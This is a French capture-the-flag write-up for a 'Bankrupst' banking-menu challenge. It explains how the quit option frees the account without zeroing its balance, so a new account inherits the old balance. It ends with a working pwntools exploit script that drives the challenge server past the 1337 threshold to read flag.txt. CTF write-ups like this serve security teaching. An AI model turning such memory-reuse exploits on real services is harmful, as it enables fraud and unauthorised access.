# Bankrupst

## Recherche de vulnérabilité

Le programme implémente un système de gestion de compte bancaire avec les fonctionnalités suivantes :

Insertion de la carte bancaire (option 1) : Lorsqu'un utilisateur insère une carte, un nouveau compte est créé en mémoire avec un solde initial de 0 et une limite de 13 dépôts par mois.

Dépôt d'argent (option 2) : L'utilisateur peut déposer un montant d'argent (entre 0 et 100) sur son compte. Chaque dépôt augmente le solde du compte et le nombre de dépôts effectués. Si l'utilisateur tente de dépasser le nombre de dépôts autorisés (13), il reçoit un message d'erreur.

Retrait d'argent (option 3) : L'utilisateur peut retirer une somme d'argent, tant que le solde est suffisant. Si l'utilisateur tente de retirer plus que ce qu'il a sur son compte ou un montant négatif, il reçoit un message d'erreur.

Vérification du solde (option 4) : L'utilisateur peut consulter son solde. Si le solde dépasse un certain seuil (1337), un message spécial est affiché, et le programme tente de lire le fichier flag.txt pour en afficher le contenu.

Suppression de la carte (option 5) : Lorsqu'un utilisateur retire sa carte bancaire, le programme réinitialise le solde et le nombre de dépôts, puis libère la mémoire allouée pour le compte.

Quitter le programme (option 6) : Lorsque l'utilisateur choisit de quitter, la mémoire allouée est libérée avec dealloc et le programme se termine.

On peut remarquer la différence de traitment entre les options 5 et 6.  
Dans l'option 6 la balance n'est pas remise à 0.  

Or la balance n'est pas remise à 0 non plus lorsque l'on crée un nouveau compte.
Donc lorsqu'un compte est créé, sa balance n'est potentiellement pas vide.

Il y a de bonnes chances que l'enchainement des options 6 et 1 replace le compte au même endroit en mémoire.

Voici le code d'exploitation 

```python
#!/usr/bin/env python3

from pwn import *

io = remote('bankrupst.serviel.fr', 1234, ssl=True)

# Insert BankRupst card
io.sendlineafter(b'option: ', b'1')

# Do maximum deposits
for i in range(13):
    io.sendlineafter(b'option: ', b'2')
    io.sendlineafter(b'deposit? ', b'100')

# dealloc BankAccount structure
io.sendlineafter(b'option: ', b'6')

# balance attribute isn't set to 0
io.sendlineafter(b'option: ', b'1')

io.sendlineafter(b'option: ', b'2')
io.sendlineafter(b'deposit? ', b'100')

io.sendlineafter(b'option: ', b'4')

io.interactive()
```